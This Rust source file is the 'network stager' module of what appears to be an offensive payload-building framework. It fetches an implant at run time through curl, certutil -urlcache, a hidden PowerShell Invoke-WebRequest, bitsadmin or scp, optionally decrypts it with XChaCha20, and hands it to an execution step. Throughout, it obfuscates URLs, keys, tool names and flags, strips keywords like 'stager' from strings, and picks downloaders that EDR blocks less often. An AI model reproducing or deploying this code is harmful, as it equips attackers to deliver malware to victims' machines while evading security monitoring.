//! Network stager (control technique).
//!
//! Fetches a payload over the network at run time instead of embedding it in the
//! artifact, optionally decrypts it, and hands the bytes to the next Execution
//! step. See `README.md` and `docs/design/network-stager.md`.

use serde::{Deserialize, Serialize};

use crate::engine::obfuscation::StringsConfig;

use super::{Capability, Category, Stability, TechniqueDef};

/// Transport-level protection of the fetched payload.
#[derive(Debug, Clone, Copy, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum StagerCrypto {
    /// The fetched blob is used as-is.
    #[default]
    None,
    /// The fetched blob is XChaCha20-Poly1305 ciphertext, decrypted in the stub.
    XChaCha20Poly1305,
}

impl StagerCrypto {
    /// Whether the fetched blob is encrypted.
    pub fn is_encrypted(self) -> bool {
        matches!(self, StagerCrypto::XChaCha20Poly1305)
    }
}

/// Which program fetches the payload.
///
/// Every transport is a child process, so an EDR that blocks one (for example
/// `certutil -urlcache`, a classic download LOLBin) may allow another. `auto`
/// uses `curl` for `http(s)`/`ftp` and `scp` for `scp://`; `curl` is the
/// default because it ships with Windows 10+ and is less commonly blocked than
/// `certutil`. A plan with an `scp://` URL always uses `scp`.
#[derive(Debug, Clone, Copy, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum Downloader {
    /// `curl` for `http(s)`/`ftp`, `scp` for `scp://` (the default).
    #[default]
    Auto,
    /// `curl.exe -sL -o <out> <url>`.
    Curl,
    /// `certutil.exe -urlcache -split -f <url> <out>`.
    Certutil,
    /// A hidden `powershell -NoProfile -Command Invoke-WebRequest`.
    Powershell,
    /// `bitsadmin /transfer <job> /download <url> <out>`.
    Bitsadmin,
}

/// Parameters for the network-stager technique.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct Params {
    /// Name of the payload this step fetches (in `build.payloads`). The payload's
    /// `format`/`export`/`args` still describe how the Execution step runs the
    /// fetched bytes; its `source` is ignored for a staged payload.
    pub payload: String,

    /// The URL to fetch. The scheme selects the transport family at build time:
    /// `http://`/`https://`/`ftp://` use the configured `downloader`, `scp://`
    /// uses `scp`.
    pub url: String,

    /// Which program downloads the payload (default: `auto` = `curl` for
    /// `http(s)`/`ftp`).
    #[serde(default)]
    pub downloader: Downloader,

    /// Whether the fetched blob is encrypted (default: `none`).
    #[serde(default)]
    pub crypto: StagerCrypto,

    /// XChaCha20 key (hex, 32 bytes); required when `crypto` is `xchacha20poly1305`.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub key: Option<String>,

    /// XChaCha20 nonce (hex, 24 bytes); required when `crypto` is `xchacha20poly1305`.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub nonce: Option<String>,

    /// Connect/read timeout, in milliseconds.
    #[serde(default = "default_timeout_ms")]
    pub timeout_ms: u32,

    /// Extra attempts after the first one.
    #[serde(default)]
    pub retries: u32,
}

/// Default stager timeout: 30 seconds.
pub fn default_timeout_ms() -> u32 {
    30_000
}

impl Default for Params {
    fn default() -> Self {
        Self {
            payload: String::new(),
            url: String::new(),
            downloader: Downloader::Auto,
            crypto: StagerCrypto::None,
            key: None,
            nonce: None,
            timeout_ms: default_timeout_ms(),
            retries: 0,
        }
    }
}

/// Static metadata for the network-stager technique.
pub const DEF: TechniqueDef = TechniqueDef {
    name: "network_stager",
    attck: &["T1105", "T1071"],
    // Works end to end on the transport plumbing, but the fetch is a child
    // process (certutil/scp) that has not been measured on a live network, and
    // `ssh` is still its own workstream — see the README.
    stability: Stability::Experimental,
    requires: &[Capability::WindowsX64, Capability::WindowsX86],
    conflicts: &[],
    category: Category::Control,
    doc_path: "src/techniques/network_stager/README.md",
    readme: include_str!("README.md"),
    stub_fragment: include_str!("stub_fragment.rs"),
    formats: &[],
    requires_indirect_syscalls: false,
    params_example: "technique: network_stager\nparams:\n  payload: implant\n  url: \"https://example.invalid/implant.bin\"\n  downloader: curl\n",
    // The download is a Win32 child process (certutil/scp), like
    // `living_off_the_land`: it is not a kernel call the stub issues.
    syscalls: &[],
    resolves_imports: false,
};

/// Runtime diagnostics the fragment can emit, as `(placeholder, plaintext)`
/// pairs. Every message is keyword-free so no technique keyword (such as
/// `stager` or `loader`) reaches the generated stub's `.rdata`.
const MESSAGES: &[(&str, &str)] = &[
    ("$MSG_SPAWN_FAILED$", "could not launch the downloader"),
    ("$MSG_DOWNLOAD_FAILED$", "the downloader failed"),
    ("$MSG_TIMEOUT$", "the downloader timed out"),
    ("$MSG_READ_FAILED$", "could not read the fetched payload"),
];

/// The `scp` transport target (`user@host:path`), parsed from an `scp://` URL at
/// build time so the fragment never parses a scheme at run time.
fn scp_target(url: &str) -> String {
    let rest = url.strip_prefix("scp://").unwrap_or(url);
    let (hostport, path) = match rest.find('/') {
        Some(slash) => (&rest[..slash], &rest[slash + 1..]),
        None => (rest, ""),
    };
    // Drop any `:port` — it is passed as `-P <port>`, not part of `user@host:path`.
    let host = match hostport.rfind(':') {
        Some(pos) => &hostport[..pos],
        None => hostport,
    };
    format!("{host}:{path}")
}

/// The port of an `scp://[user@]host[:port]/path` URL, or empty.
fn scp_port(url: &str) -> String {
    let rest = url.strip_prefix("scp://").unwrap_or(url);
    let hostport = match rest.find('/') {
        Some(slash) => &rest[..slash],
        None => rest,
    };
    match hostport.rfind(':') {
        Some(pos) => hostport[pos + 1..].to_string(),
        None => String::new(),
    }
}

impl Params {
    /// Renders the stager fragment for these parameters.
    ///
    /// The URL, the credentials embedded in it, the crypto key/nonce and the
    /// downloader command/flag strings are all emitted as code that rebuilds the
    /// value at run time through `strings`, so none of them lands in cleartext.
    /// The transport (certutil vs scp) is decided here at build time from the URL
    /// scheme, so the fragment needs no scheme literals.
    pub fn render_fragment(&self, strings: &StringsConfig) -> String {
        let is_scp = self.url.starts_with("scp://");
        // 0 scp, 1 curl, 2 certutil, 3 powershell, 4 bitsadmin. An `scp://` URL
        // always uses scp, whatever `downloader` says.
        let downloader = if is_scp {
            0
        } else {
            match self.downloader {
                Downloader::Auto | Downloader::Curl => 1,
                Downloader::Certutil => 2,
                Downloader::Powershell => 3,
                Downloader::Bitsadmin => 4,
            }
        };

        let url = strings.obfuscate(&self.url).render_stub_expr("stager_url");
        let scp_target = strings
            .obfuscate(&scp_target(&self.url))
            .render_stub_expr("scp_target");
        let scp_port = strings
            .obfuscate(&scp_port(&self.url))
            .render_stub_expr("scp_port");
        let key = strings
            .obfuscate(self.key.as_deref().unwrap_or(""))
            .render_stub_expr("stager_key");
        let nonce = strings
            .obfuscate(self.nonce.as_deref().unwrap_or(""))
            .render_stub_expr("stager_nonce");

        // Every downloader's binary name and flags are obfuscated. Only the one
        // chosen at build time runs, but all are rendered so the fragment's
        // `match` compiles.
        let lit = |text: &str, name: &str| strings.obfuscate(text).render_stub_expr(name);
        let bin_scp = lit("scp", "bin_scp");
        let bin_curl = lit("curl", "bin_curl");
        let bin_certutil = lit("certutil", "bin_certutil");
        let bin_powershell = lit("powershell", "bin_powershell");
        let bin_bitsadmin = lit("bitsadmin", "bin_bitsadmin");
        let arg_urlcache = lit("-urlcache", "arg_urlcache");
        let arg_split = lit("-split", "arg_split");
        let arg_f = lit("-f", "arg_f");
        let arg_o = lit("-o", "arg_o");
        let arg_strict = lit("StrictHostKeyChecking=no", "arg_strict");
        let arg_p = lit("-P", "arg_p");
        let arg_curl_silent = lit("-sL", "arg_curl_silent");
        let arg_curl_output = lit("-o", "arg_curl_output");
        let arg_ps_noprofile = lit("-NoProfile", "arg_ps_noprofile");
        let arg_ps_command = lit("-Command", "arg_ps_command");
        let ps_uri_prefix = lit("Invoke-WebRequest -UseBasicParsing -Uri '", "ps_uri_prefix");
        let ps_outfile_mid = lit("' -OutFile '", "ps_outfile_mid");
        let ps_suffix = lit("'", "ps_suffix");
        let arg_bits_transfer = lit("/transfer", "arg_bits_transfer");
        let arg_bits_job = lit("picaro", "arg_bits_job");
        let arg_bits_download = lit("/download", "arg_bits_download");
        let arg_bits_priority = lit("/priority", "arg_bits_priority");
        let arg_bits_normal = lit("normal", "arg_bits_normal");

        let mut rendered = DEF
            .stub_fragment
            .replace("$URL_DEF$", &url)
            .replace("$SCP_TARGET_DEF$", &scp_target)
            .replace("$SCP_PORT_DEF$", &scp_port)
            .replace("$KEY_DEF$", &key)
            .replace("$NONCE_DEF$", &nonce)
            .replace("$DOWNLOADER$", &format!("{downloader}u32"))
            .replace(
                "$CRYPTO$",
                if self.crypto.is_encrypted() {
                    "true"
                } else {
                    "false"
                },
            )
            .replace("$TIMEOUT_MS$", &format!("{}u32", self.timeout_ms))
            .replace("$RETRIES$", &format!("{}u32", self.retries))
            .replace("$BIN_SCP$", &bin_scp)
            .replace("$BIN_CURL$", &bin_curl)
            .replace("$BIN_CERTUTIL$", &bin_certutil)
            .replace("$BIN_POWERSHELL$", &bin_powershell)
            .replace("$BIN_BITSADMIN$", &bin_bitsadmin)
            .replace("$ARG_URLCACHE$", &arg_urlcache)
            .replace("$ARG_SPLIT$", &arg_split)
            .replace("$ARG_F$", &arg_f)
            .replace("$ARG_O$", &arg_o)
            .replace("$ARG_STRICT$", &arg_strict)
            .replace("$ARG_P$", &arg_p)
            .replace("$ARG_CURL_SILENT$", &arg_curl_silent)
            .replace("$ARG_CURL_OUTPUT$", &arg_curl_output)
            .replace("$ARG_PS_NOPROFILE$", &arg_ps_noprofile)
            .replace("$ARG_PS_COMMAND$", &arg_ps_command)
            .replace("$PS_URI_PREFIX$", &ps_uri_prefix)
            .replace("$PS_OUTFILE_MID$", &ps_outfile_mid)
            .replace("$PS_SUFFIX$", &ps_suffix)
            .replace("$ARG_BITS_TRANSFER$", &arg_bits_transfer)
            .replace("$ARG_BITS_JOB$", &arg_bits_job)
            .replace("$ARG_BITS_DOWNLOAD$", &arg_bits_download)
            .replace("$ARG_BITS_PRIORITY$", &arg_bits_priority)
            .replace("$ARG_BITS_NORMAL$", &arg_bits_normal);
        for (index, (placeholder, text)) in MESSAGES.iter().enumerate() {
            rendered = rendered.replace(
                placeholder,
                &strings
                    .obfuscate(text)
                    .render_stub_expr(&format!("msg_{index}")),
            );
        }
        rendered
    }
}

#[cfg(test)]
mod tests;
